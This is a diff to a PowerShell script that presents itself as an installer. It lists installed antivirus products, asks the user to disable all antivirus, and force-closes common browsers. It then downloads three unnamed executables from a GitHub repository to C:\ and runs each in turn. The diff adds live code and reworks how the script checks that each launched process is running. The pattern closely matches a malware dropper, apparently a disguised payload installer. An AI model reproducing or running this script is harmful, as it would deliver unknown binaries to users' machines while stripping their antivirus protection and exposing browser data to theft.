@@ -1,4 +1,3 @@
-# Function to list installed antivirus software
 function Get-AntivirusSoftware {
     $antivirusProducts = Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntivirusProduct
     if ($antivirusProducts) {
@@ -13,12 +12,15 @@ function Get-AntivirusSoftware {
     }
 }
 
-# Function to check if a process is running
-function Is-ProcessRunning($processName) {
-    return Get-Process -Name $processName -ErrorAction SilentlyContinue
+function Is-ProcessRunningByPID($processId) {
+    try {
+        Get-Process -Id $processId -ErrorAction Stop | Out-Null
+        return $true
+    } catch {
+        return $false
+    }
 }
 
-# Function to close all popular browsers
 function Close-Browsers {
     $browsers = @("chrome", "firefox", "iexplore", "msedge", "opera", "yandex", "brave", "vivaldi", "safari")
     foreach ($browser in $browsers) {
@@ -26,64 +28,60 @@ function Close-Browsers {
     }
 }
 
-# Main script
-Write-Host "Checking for installed antivirus software..."
+Write-Host "Checking for installed antivirus software..." 
 Get-AntivirusSoftware
 
 Write-Host "`nPlease ensure all antivirus software is disabled before proceeding."
 $response = Read-Host "Type 'y' to continue with the installation process"
 
 if ($response -eq 'y') {
-    # Close all popular browsers
     Write-Host "`nClosing all popular browsers..."
     Close-Browsers
 
     Write-Host "`nStarting installation process. Do not close this window..." -ForegroundColor Green
     
-    # Download and execute file 1
     Write-Host "Downloading file 1..."
     Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/1.exe" -OutFile "C:\1.exe"
     Write-Host "File 1 downloaded successfully."
     
     Write-Host "Executing file 1..."
-    Start-Process -FilePath "C:\1.exe" -NoNewWindow -PassThru -Wait
-    if (Is-ProcessRunning "1") {
-        Write-Host "File 1 started successfully."
-    } else {
-        Write-Host "File 1 did not start. Installation failed." -ForegroundColor Red
-        Read-Host "`nPress Enter to close this window..."
-        exit
-    }
+    $process1 = Start-Process -FilePath "C:\1.exe" -NoNewWindow -PassThru
+    Write-Host "File 1 started with PID: $($process1.Id)"
 
-    # Download and execute file 2
+    while (-not (Is-ProcessRunningByPID $process1.Id)) {
+        Start-Sleep -Seconds 1
+    }
+    Write-Host "File 1 started successfully."
+
+    Write-Host "`n"
+
     Write-Host "Downloading file 2..."
     Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/2.exe" -OutFile "C:\2.exe"
     Write-Host "File 2 downloaded successfully."
     
     Write-Host "Executing file 2..."
-    Start-Process -FilePath "C:\2.exe" -NoNewWindow -PassThru -Wait
-    if (Is-ProcessRunning "2") {
-        Write-Host "File 2 started successfully."
-    } else {
-        Write-Host "File 2 did not start. Installation failed." -ForegroundColor Red
-        Read-Host "`nPress Enter to close this window..."
-        exit
-    }
+    $process2 = Start-Process -FilePath "C:\2.exe" -NoNewWindow -PassThru
+    Write-Host "File 2 started with PID: $($process2.Id)"
 
-    # Download and execute file 3
+    while (-not (Is-ProcessRunningByPID $process2.Id)) {
+        Start-Sleep -Seconds 1
+    }
+    Write-Host "File 2 started successfully."
+
+    Write-Host "`n"
+
     Write-Host "Downloading file 3..."
     Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/refs/heads/main/3.exe" -OutFile "C:\3.exe"
     Write-Host "File 3 downloaded successfully."
     
     Write-Host "Executing file 3..."
-    Start-Process -FilePath "C:\3.exe" -NoNewWindow -PassThru -Wait
-    if (Is-ProcessRunning "3") {
-        Write-Host "File 3 started successfully."
-    } else {
-        Write-Host "File 3 did not start. Installation failed." -ForegroundColor Red
-        Read-Host "`nPress Enter to close this window..."
-        exit
+    $process3 = Start-Process -FilePath "C:\3.exe" -NoNewWindow -PassThru
+    Write-Host "File 3 started with PID: $($process3.Id)"
+
+    while (-not (Is-ProcessRunningByPID $process3.Id)) {
+        Start-Sleep -Seconds 1
     }
+    Write-Host "File 3 started successfully."
 
     Write-Host "`nAll files started successfully. Installation complete. You may now close this window." -ForegroundColor Green
 } else {
